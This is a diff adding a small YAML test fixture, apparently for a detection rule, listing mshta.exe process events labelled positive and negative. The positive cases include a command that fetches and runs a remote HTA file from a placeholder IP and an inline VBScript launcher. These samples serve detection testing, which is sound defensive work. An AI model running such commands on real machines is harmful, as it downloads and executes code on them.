@@ -1,0 +1,8 @@
+positive:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe http://203.0.113.9/a.hta'
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta vbscript:CreateObject("Wscript.Shell").Run("calc")'
+negative:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe "C:\Program Files\Vendor\app\help.hta"'
